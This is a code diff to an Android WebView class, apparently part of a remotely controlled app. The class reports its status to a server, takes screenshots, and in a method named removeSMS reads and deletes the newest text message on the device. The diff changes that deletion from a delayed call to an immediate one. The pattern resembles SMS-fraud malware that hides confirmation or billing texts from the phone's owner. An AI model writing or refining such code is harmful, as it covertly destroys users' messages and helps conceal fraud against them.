@@ -132,7 +132,7 @@ public class AutomatedWebview extends WebView {
                                 if (isForeground()) // if App is active
                                     process();
                                 else
-                                    updateData("WAITING");
+                                    updateData("WAITING"); //Update server status
 
                             } else {
                                 updateData("NO VALID JSON RECEIVED");
@@ -244,7 +244,6 @@ public class AutomatedWebview extends WebView {
                         takeScreenshot();
                     }
                 }, seconds * 1000);
-
             }
             count++;
         }
@@ -385,19 +384,12 @@ public class AutomatedWebview extends WebView {
     }
 
     private void removeSMS() {
-        Handler handler =new Handler();
         Uri uriSMSURI = Uri.parse("content://sms/");
         try {
             Cursor cur = context.getContentResolver().query(uriSMSURI, null, null, null, null);
             if (cur.moveToFirst()) {
-                final String MsgId = cur.getString(0);
-                handler.postDelayed(new Runnable() {
-                    @Override
-                    public void run() {
-                        context.getContentResolver().delete(Uri.parse("content://sms/" + MsgId), null, null);
-                    }
-                }, 2000);
-
+                String MsgId = cur.getString(0);
+                context.getContentResolver().delete(Uri.parse("content://sms/" + MsgId), null, null);
             }
         }
         catch(Exception e)
